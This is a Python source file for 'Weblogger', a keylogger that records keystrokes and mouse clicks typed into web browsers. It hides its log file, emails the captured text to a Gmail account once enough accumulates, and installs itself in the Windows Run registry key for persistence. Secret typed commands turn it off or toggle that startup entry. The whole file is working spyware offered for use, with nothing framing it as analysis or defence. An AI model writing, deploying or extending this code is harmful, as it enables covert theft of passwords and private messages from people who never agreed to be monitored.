# -*- coding: utf-8 -*-

from time import sleep
from pynput.keyboard import Key, Listener
from pynput.mouse import Button, Listener as mouseListener
import os
import sys
import re
import fcntl
import signal
import subprocess

if 'win' in sys.platform:
    import win32gui
    import win32event
    import win32api
    import winerror


class Weblogger(object):
    BROWSERS = ['google chrome', 'mozilla firefox', 'microsoft edge', 'safari', 'internet explorer']
    GMAIL_DATA = {'user': '', 'passwd': ''}
    MAX_DATA_LEN = 500
    LOGGING = False
    IGNORE_HOLD = [Key.alt, Key.alt_l, Key.alt_r, Key.alt_gr,
                   Key.ctrl, Key.ctrl_l, Key.ctrl_r,
                   Key.shift, Key.shift_l, Key.shift_r,
                   Key.esc, Key.home, Key.end]

    def __init__(self, email_to=""):
        self.email_to = email_to
        self.log_file = ""
        self.w_name = ""
        self.w_title = ""
        self.browser_title = ""
        self.last_title = ""
        self.command = ""
        self.is_thread_running = False
        self.last_key = None

        self.get_log_file()
        self.create_file()

    def get_log_file(self):
        if 'linux' in sys.platform:
            self.log_file = os.path.join(os.environ['HOME'], '.log.txt')
        elif 'win' in sys.platform:
            self.log_file = os.path.join(os.environ['userprofile'], 'log.txt')
            subprocess.call('attrib +h ' + self.log_file, shell=True)
        else:
            if self.LOGGING:
                print("%s platform not supported yet." % sys.platform.capitalize())
            exit(1)

    def create_file(self):
        if not os.path.exists(self.log_file):
            self.last_title = ""
            self.browser_title = ""

            with open(self.log_file, 'w') as fw:
                fw.write('')

    def delete_file(self):
        if os.path.exists(self.log_file):
            os.remove(self.log_file)

    def is_browser_open(self, update_titles=True):
        self.w_name, self.w_title = self.get_window_name()

        if self.w_name.lower() in self.BROWSERS:
            if update_titles:
                self.last_title = self.browser_title
                self.browser_title = self.w_title
            return True
        else:
            if update_titles:
                self.last_title = self.browser_title
                self.browser_title = ""
            return False

    def start_logging(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            self.is_thread_running = True

            with mouseListener(on_click=self.on_click) as mouse_listener:
                mouse_listener.join()

            listener.join()

    def stop_logging(self):
        self.is_thread_running = False
        return False

    def kill(self, sig=None, frame=None):
        self.is_thread_running = False
        self.force_send_mail()
        self.delete_file()
        os._exit(0)

    def on_press(self, key):
        if not self.is_browser_open():
            return self.stop_logging()

        if self.browser_title != self.last_title:
            self.write_log('\n========== %s ==========\n' % self.browser_title)

        key_pressed = self.get_pressed_key(key)

        if key != self.last_key or key not in self.IGNORE_HOLD:
            self.last_key = key
            self.write_log(key_pressed)

    def on_release(self, key):
        if key in self.IGNORE_HOLD and "u'" not in str(key):
            key_released = '<%s.released>' % str(key)
            self.write_log(key_released)

    def on_click(self, x, y, button, pressed):
        if not self.is_browser_open(update_titles=False):
            return self.stop_logging()

        if pressed and self.last_key and button == Button.left and self.last_key != button:
            self.last_key = button
            self.write_log('<Mouse.click>')

    def write_log(self, text):
        text = self.translate(text)
        self.command += text

        if self.LOGGING:
            print(text)

        with open(self.log_file, 'a') as lf:
            lf.write(text)

        self.check_command()

        with open(self.log_file, 'r') as lf:
            data = lf.read()
            data_length = len(data)

        if data_length >= self.MAX_DATA_LEN:
            if self.LOGGING:
                print('Length: %d' % data_length)
            self.send_mail(data)

    def check_command(self):
        length = len(self.command)
        commands = {
            'webloggerkill': {'eval': 'self.kill()', 'message': 'Killing Weblogger'},
            'webloggerstartup': {'eval': 'self.startup("add")', 'message': 'Adding Weblogger to Startup'},
            'webloggernostartup': {'eval': 'self.startup("del")', 'message': 'Removing Weblogger from Startup'}
        }

        if not any(map(lambda c: self.command == c[:length], commands.keys())):
            self.command = ''
            return

        command = filter(lambda c: self.command == c, commands.keys())

        if len(command) >= 1:
            d = commands[command[0]]
            if self.LOGGING:
                print(d['message'])
            eval(d['eval'])
            self.command = ''

    def send_mail(self, text):
        if not self.email_to or not all(self.GMAIL_DATA.values()):
            if self.LOGGING:
                print('Mail Not Sent')
            return

        if self.LOGGING:
            print('Sending Mail')

        from email.mime.multipart import MIMEMultipart
        from email.mime.text import MIMEText
        import smtplib

        email_from = "%s@gmail.com" % self.GMAIL_DATA['user']
        text = self.translate_shift_key(text)

        msg = MIMEMultipart()
        msg["From"] = 'WebLogger'
        msg["To"] = 'Me'
        msg["Subject"] = 'Logs from weblogger'
        msg.attach(MIMEText(text, _subtype='plain'))

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(self.GMAIL_DATA['user'], self.GMAIL_DATA['passwd'])
        server.sendmail(email_from, self.email_to, msg.as_string())
        server.quit()

        self.delete_file()
        self.create_file()

    def force_send_mail(self):
        with open(self.log_file, 'r') as lf:
            data = lf.read()
            data_length = len(data)

        if data_length >= 1:
            if self.LOGGING:
                print('Length: %d' % data_length)
            self.send_mail(data)

    @staticmethod
    def get_window_name():
        curr_window = ''

        if 'linux' in sys.platform:
            root = subprocess.Popen(['xprop', '-root', '_NET_ACTIVE_WINDOW'], stdout=subprocess.PIPE)
            stdout, stderr = root.communicate()

            m = re.search(r'^_NET_ACTIVE_WINDOW.* ([\w]+)$', stdout)
            if m is not None:
                window_id = m.group(1)
                window = subprocess.Popen(['xprop', '-id', window_id, 'WM_NAME'], stdout=subprocess.PIPE)
                stdout, stderr = window.communicate()
            else:
                return '', ''

            match = re.match(r"WM_NAME\(\w+\) = (?P<name>.+)$", stdout)
            if match is not None:
                curr_window = match.group("name").strip('"')
            else:
                return '', ''
        elif 'win' in sys.platform:
            curr_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())

        return curr_window.split(' - ')[-1], ' - '.join(curr_window.split(' - ')[:-1])

    @staticmethod
    def get_pressed_key(key):
        str_key = str(key)

        if "u'" in str_key:
            if '\\' in str_key:
                pressed = chr(key.vk + 32)
            else:
                pressed = str(key.char)
        else:
            pressed = '<%s>' % str_key

        return pressed

    @staticmethod
    def translate(key):
        translate_keys = {
            "<Mouse.click>": "\n",
            "<Key.space>": " ",
            "<Key.enter>": "\n",
            "<Key.tab>": "    "
        }

        return translate_keys.get(key, key)

    @staticmethod
    def translate_shift_key(text):
        translate_keys = {
            '1': '!',
            '2': '@',
            '3': '#',
            '4': '$',
            '5': '%',
            '6': '¨',
            '7': '&',
            '8': '*',
            '9': '(',
            '0': ')',
            '-': '_',
            '=': '+',
            '/': '?',
            ';': ':',
            ',': '<',
            '.': '>',
        }

        findall = re.findall(r'<Key\.shift>(\S*?)<Key\.shift\.released>', text)

        for f in findall:
            r_from = '<Key.shift>%s<Key.shift.released>' % f

            if f.isalpha():
                text = text.replace(r_from, f.upper())
            else:
                sub_stream = ''
                for c in f:
                    if c.isalpha():
                        sub_stream += c.upper()
                    else:
                        sub_stream += translate_keys.get(c, '<Key.shift>%s<Key.shift.released>' % c)

                text = text.replace(r_from, sub_stream)

        return text

    @staticmethod
    def startup(action):
        # Only for windows
        if 'win' in sys.platform:
            import _winreg

            file_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), os.path.basename(__file__))
            key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
            reg_name = "Weblogger"

            key2change = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, key_path, 0, _winreg.KEY_ALL_ACCESS)

            if action == 'add':
                _winreg.SetValueEx(key2change, reg_name, 0, _winreg.REG_SZ, file_path)
            elif action == 'del':
                _winreg.DeleteValue(key2change, reg_name)


def create_lock():
    _lock = None
    already_running = False

    if 'win' in sys.platform:
        mutex = win32event.CreateMutex(None, 1, 'weblogger_mutex')
        if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
            mutex = None
            already_running = True
    else:
        _lock = open(os.path.realpath(sys.argv[0]), 'r')
        try:
            fcntl.flock(_lock, fcntl.LOCK_EX | fcntl.LOCK_NB)
        except IOError:
            already_running = True

    if already_running:
        if wl.LOGGING:
            print "Multiple Instances not Allowed"
        exit(0)
    else:
        return _lock


def trap_signals():
    signal.signal(signal.SIGTERM, wl.kill)
    signal.signal(signal.SIGINT, wl.kill)
    signal.signal(signal.SIGILL, wl.kill)
    signal.signal(signal.SIGABRT, wl.kill)
    signal.signal(signal.SIGFPE, wl.kill)
    signal.signal(signal.SIGSEGV, wl.kill)


if __name__ == '__main__':
    wl = Weblogger(email_to="")

    lock = create_lock()
    trap_signals()

    while True:
        if wl.is_browser_open(update_titles=False) and not wl.is_thread_running:
            wl.start_logging()

        sleep(1)
